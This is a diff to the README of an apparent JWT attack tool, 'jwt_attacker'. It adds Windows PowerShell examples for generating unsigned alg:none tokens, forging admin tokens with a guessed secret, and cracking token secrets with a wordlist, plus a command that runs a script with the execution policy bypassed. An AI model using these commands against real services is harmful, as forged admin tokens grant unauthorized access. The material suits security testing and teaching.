@@ -61,6 +61,33 @@ Create unsigned tokens (alg:none attack):
 python -m jwt_attacker alg-none --payload '{"user": "admin", "role": "administrator"}'
 ```
 
+### Windows PowerShell Usage
+
+For Windows PowerShell users, use escaped double quotes:
+
+```powershell
+# alg:none attack
+python -m jwt_attacker alg-none --payload '{\"user\":\"admin\",\"role\":\"administrator\"}'
+
+# Forge JWT token
+python -m jwt_attacker forge --payload '{\"user\":\"admin\"}' --secret "mysecret"
+
+# Crack JWT token
+python -m jwt_attacker crack --token "eyJ0eXAiOi..." --wordlist examples/wordlist.txt
+```
+
+**PowerShell Tips:**
+
+- Use single quotes around the entire JSON payload
+- Escape double quotes inside JSON with backslash: `\"`
+- Example: `--payload '{\"key\":\"value\"}'`
+
+For an interactive PowerShell example script, run:
+
+```powershell
+powershell -ExecutionPolicy Bypass -File examples/windows_examples.ps1
+```
+
 ## Project Structure
 
 ```
@@ -104,6 +131,25 @@ python -m jwt_attacker crack --token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJle
 
 ```bash
 python -m jwt_attacker forge --payload '{"user": "admin", "admin": true}' --secret "secret123"
+```
+
+### Example 3: Generate Unsigned Token
+
+```bash
+python -m jwt_attacker alg-none --payload '{"user": "admin", "admin": true}'
+```
+
+### Windows PowerShell Examples
+
+```powershell
+# Example 1: Crack a weak token
+python -m jwt_attacker crack --token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." --wordlist examples/wordlist.txt
+
+# Example 2: Forge admin token
+python -m jwt_attacker forge --payload '{\"user\":\"admin\",\"admin\":true}' --secret "secret123"
+
+# Example 3: Generate unsigned token
+python -m jwt_attacker alg-none --payload '{\"user\":\"admin\",\"admin\":true}'
 ```
 
 ### Example 3: Generate Unsigned Token
